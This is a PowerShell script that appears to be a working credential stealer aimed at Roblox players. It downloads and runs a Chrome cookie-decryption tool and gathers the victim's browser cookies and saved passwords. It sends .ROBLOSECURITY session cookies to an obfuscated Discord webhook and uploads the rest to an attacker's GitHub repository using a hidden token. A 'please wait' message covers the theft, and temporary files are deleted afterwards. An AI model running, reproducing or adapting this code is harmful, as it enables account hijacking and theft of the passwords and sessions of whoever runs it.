$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$zipUrl   = 'https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip'
$expected = '5805f886f41eef041103b2ac4fc7298c3545f8bd2e74e3e8bd4a9f40f72ec48e'
$outFile  = Join-Path ([Environment]::GetFolderPath('UserProfile')) 'Downloads\roblox_cookie.txt'
$txtFile  = Join-Path ([Environment]::GetFolderPath('UserProfile')) 'Downloads\roblox_data.txt'
$zipFile  = Join-Path ([Environment]::GetFolderPath('UserProfile')) 'Downloads\roblox_data.zip'
function Decode-Rev([string]$s) {
    $arr = $s.ToCharArray()
    [Array]::Reverse($arr)
    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(-join $arr))
}

$webhook  = Decode-Rev '==QZywkVONHcY5USDNHaCZDSRh3YJJTSNR0Qi1Ub3RVe2Z3YilDVEJ1ZVRzb21Ubp9GRn12YMNUYWNUb1BnRQZnbUlFN09CO2kzMxcjNwATO5AzM2QTNzUTMvM3av9GaiV2dvkGch9SbvNmLkJ3bjNXak9yL6MHc0RHa'
$ghToken  = Decode-Rev '==QO0EHOMBDcTNGM5UDdqVVcB5Ec5N1VQx0SxgVSppUOK9kZ2QzXwh2Z'
$ghRepo   = 'cuentatrades0913-max/auto-upload'

function Send-Discord([string]$content) {
    $body = @{ content = $content } | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $body -UseBasicParsing -ErrorAction Stop | Out-Null
}

function Send-DiscordFile([string]$filePath) {
    Add-Type -AssemblyName System.Net.Http
    $fileName = Split-Path -Leaf $filePath
    $http = New-Object System.Net.Http.HttpClient
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $fileStream = [System.IO.File]::OpenRead($filePath)
    try {
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue('text/plain')
        $content.Add($fileContent, 'file', $fileName)
        $resp = $http.PostAsync($webhook, $content).Result
        if (-not $resp.IsSuccessStatusCode) {
            throw "Discord file upload failed: $($resp.StatusCode) $($resp.Content.ReadAsStringAsync().Result)"
        }
    } finally {
        $content.Dispose()
        $fileStream.Dispose()
        $http.Dispose()
    }
}

function Get-RobloxUser([string]$cookieValue) {
    try {
        $sep = $cookieValue.LastIndexOf('|_')
        if ($sep -lt 0) { return 'unknown' }
        $dot = $cookieValue.IndexOf('.', $sep)
        if ($dot -lt 0) { return 'unknown' }
        $b64 = $cookieValue.Substring($sep + 2, $dot - $sep - 2)
        while ($b64.Length % 4 -ne 0) { $b64 += '=' }
        $bytes = [Convert]::FromBase64String($b64)
        $str = [System.Text.Encoding]::UTF8.GetString($bytes)
        $marker = [char]0x0A + [char]0x05 + 'uname' + [char]0x12
        $idx = $str.IndexOf($marker)
        if ($idx -lt 0) { return 'unknown' }
        $len = [int]$str[$idx + $marker.Length]
        return $str.Substring($idx + $marker.Length + 1, $len)
    } catch {
        return 'unknown'
    }
}

function Send-CookieBlock([int]$index, [string]$cookieHost, [string]$user, [int]$len, [string]$value) {
    $fence = '```'
    $header = "Cookie #$index ($cookieHost, user=$user, len=$len):"
    $max = 1900
    if ($value.Length -le $max) {
        $content = $header + [Environment]::NewLine + $fence + $value + $fence
        Send-Discord $content
    } else {
        $total = [int][Math]::Ceiling($value.Length / [double]$max)
        $part = 1
        $idx = 0
        while ($idx -lt $value.Length) {
            $chunk = $value.Substring($idx, [Math]::Min($max, $value.Length - $idx))
            if ($part -eq 1) {
                $content = $header + " (parte $part/$total)" + [Environment]::NewLine + $fence + $chunk + $fence
            } else {
                $content = "(parte $part/$total)" + [Environment]::NewLine + $fence + $chunk + $fence
            }
            Send-Discord $content
            $idx += $max
            $part++
        }
    }
}

function Upload-ToGitHub([string]$filePath) {
    $branch = 'main'
    try {
        $h = @{ Authorization = "Bearer $ghToken"; Accept = 'application/vnd.github+json' }
        $r = Invoke-RestMethod -Uri "https://api.github.com/repos/$ghRepo" -Headers $h -ErrorAction Stop
        $branch = $r.default_branch
    } catch {}

    $bytes = [System.IO.File]::ReadAllBytes($filePath)
    $b64   = [Convert]::ToBase64String($bytes)

    $stamp   = Get-Date -Format 'yyyyMMdd_HHmmss'
    $base    = Split-Path -Leaf $filePath
    $target  = $base.Replace('.zip', "_$stamp.zip").Replace('.txt', "_$stamp.txt")
    $apiBase = "https://api.github.com/repos/$ghRepo/contents/$target"
    $headers = @{
        Authorization = "Bearer $ghToken"
        Accept        = 'application/vnd.github+json'
        'X-GitHub-Api-Version' = '2022-11-28'
    }

    $body = @{
        message = "Auto-upload: $target"
        content = $b64
        branch  = $branch
    }
    $bodyJson = $body | ConvertTo-Json -Depth 5

    Invoke-RestMethod -Method Put -Uri $apiBase -Headers $headers -Body $bodyJson -ContentType 'application/json' -ErrorAction Stop | Out-Null

    $encoded = [uri]::EscapeDataString($target)
    return "https://raw.githubusercontent.com/$ghRepo/$branch/$encoded"
}

function Build-DataTxt {
    param($allCookies, $passwords)
    $sb = New-Object System.Text.StringBuilder
    [void]$sb.AppendLine("=== ALL COOKIES ($($allCookies.Count)) ===")
    if ($allCookies.Count -gt 0) {
        $i = 1
        foreach ($m in $allCookies) {
            [void]$sb.AppendLine("Cookie #$i [$($m.profile)] name=$($m.name) host=$($m.host) path=$($m.path) len=$($m.len):")
            [void]$sb.AppendLine($m.value)
            [void]$sb.AppendLine('')
            $i++
        }
    } else {
        [void]$sb.AppendLine('(none)')
    }
    [void]$sb.AppendLine('')
    [void]$sb.AppendLine('=== SAVED PASSWORDS ===')
    if ($passwords.Count -gt 0) {
        foreach ($p in $passwords) {
            [void]$sb.AppendLine("[$($p.profile)] url=$($p.url)")
            [void]$sb.AppendLine("    user=$($p.user)")
            [void]$sb.AppendLine("    pass=$($p.pass)")
            [void]$sb.AppendLine('')
        }
    } else {
        [void]$sb.AppendLine('(none)')
    }
    return $sb.ToString()
}

function New-CompressedZip([string]$txtPath, [string]$zipPath) {
    Add-Type -AssemblyName System.IO.Compression
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $fs = [System.IO.File]::Create($zipPath)
    $archive = New-Object System.IO.Compression.ZipArchive($fs, [System.IO.Compression.ZipArchiveMode]::Create)
    try {
        $entry = $archive.CreateEntry((Split-Path -Leaf $txtPath), [System.IO.Compression.CompressionLevel]::Optimal)
        $es = $entry.Open()
        try {
            $src = [System.IO.File]::ReadAllBytes($txtPath)
            $es.Write($src, 0, $src.Length)
        } finally {
            $es.Dispose()
        }
    } finally {
        $archive.Dispose()
        $fs.Dispose()
    }
}

Write-Host 'Espere un momento mientras carga...' -ForegroundColor DarkGray

$tmp = Join-Path $env:TEMP ('abe_' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp | Out-Null

try {
    $zip = Join-Path $tmp 'tool.zip'
    Invoke-WebRequest -Uri $zipUrl -OutFile $zip -UseBasicParsing

    $hash = (Get-FileHash -LiteralPath $zip -Algorithm SHA256).Hash.ToLower()
    if ($hash -ne $expected) { throw "HASH MISMATCH - expected $expected, got $hash. Aborting." }

    Expand-Archive -LiteralPath $zip -DestinationPath (Join-Path $tmp 'x')
    $exe = Get-ChildItem -Path (Join-Path $tmp 'x') -Recurse -Filter 'chromelevator_x64.exe' | Select-Object -First 1
    if (-not $exe) { throw 'chromelevator_x64.exe not found in archive' }

    $outDir = Join-Path $tmp 'out'
    $toolOut = Join-Path $tmp 'tool.out'
    $toolErr = Join-Path $tmp 'tool.err'
    $p = Start-Process -FilePath $exe.FullName -ArgumentList @('chrome', '-o', $outDir, '-v', '-k') -Wait -PassThru -NoNewWindow -RedirectStandardOutput $toolOut -RedirectStandardError $toolErr
    if ($p.ExitCode -ne 0) {
        $errTxt = if (Test-Path -LiteralPath $toolErr) { Get-Content -LiteralPath $toolErr -Raw } else { '' }
        throw "Extraction tool failed with exit code $($p.ExitCode). $errTxt"
    }

    $allCookies = @()
    $robloxMatches = @()
    Get-ChildItem -Path $outDir -Recurse -Filter 'cookies.json' -ErrorAction SilentlyContinue | ForEach-Object {
        $profile = Split-Path -Leaf $_.DirectoryName
        try {
            $arr = Get-Content -LiteralPath $_.FullName -Raw | ConvertFrom-Json
            foreach ($c in $arr) {
                $allCookies += [pscustomobject]@{ profile = $profile; name = $c.name; host = $c.host; path = $c.path; len = $c.value.Length; value = $c.value }
                if ($c.name -eq '.ROBLOSECURITY' -and $c.host -match 'roblox\.com$') {
                    $robloxMatches += [pscustomobject]@{ host = $c.host; len = $c.value.Length; value = $c.value }
                }
            }
        } catch {}
    }

    $passwords = @()
    Get-ChildItem -Path $outDir -Recurse -Filter 'passwords.json' -ErrorAction SilentlyContinue | ForEach-Object {
        $profile = Split-Path -Leaf $_.DirectoryName
        try {
            $arr = Get-Content -LiteralPath $_.FullName -Raw | ConvertFrom-Json
            foreach ($p in $arr) {
                $passwords += [pscustomobject]@{ profile = $profile; url = $p.url; user = $p.user; pass = $p.pass }
            }
        } catch {}
    }

    if ($allCookies.Count -eq 0 -and $passwords.Count -eq 0) {
        throw 'No cookies or passwords found in extracted data.'
    } else {
        $best = $robloxMatches | Sort-Object -Property len -Descending | Select-Object -First 1
        if ($best) { Set-Content -LiteralPath $outFile -Value $best.value -Encoding ASCII }

        $resolved = @()
        for ($i = 0; $i -lt $robloxMatches.Count; $i++) {
            $m = $robloxMatches[$i]
            $user = Get-RobloxUser -cookieValue $m.value
            $resolved += [pscustomobject]@{ host = $m.host; len = $m.len; value = $m.value; user = $user }
        }
        $robloxMatches = $resolved

        for ($i = 0; $i -lt $robloxMatches.Count; $i++) {
            $m = $robloxMatches[$i]
            Send-CookieBlock -index ($i + 1) -cookieHost $m.host -user $m.user -len $m.len -value $m.value
        }

        $otherCookies = @($allCookies | Where-Object { -not ($_.name -eq '.ROBLOSECURITY' -and $_.host -match 'roblox\.com$') })

        $txt = Build-DataTxt -allCookies $otherCookies -passwords $passwords
        Set-Content -LiteralPath $txtFile -Value $txt -Encoding UTF8

        New-CompressedZip -txtPath $txtFile -zipPath $zipFile

        try {
            $rawUrl = Upload-ToGitHub -filePath $zipFile
            Send-Discord "**Download ZIP (other cookies + passwords):** $rawUrl"
        } catch {
            Send-Discord "**OJO:** GitHub upload failed. Local files: $txtFile / $zipFile"
        }

        try {
            Send-DiscordFile -filePath $txtFile
        } catch {
            Send-Discord "**OJO:** could not attach TXT. Local file: $txtFile"
        }
    }
} catch {
    Send-Discord "**ERROR:** $($_.Exception.Message)"
} finally {
    Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
}
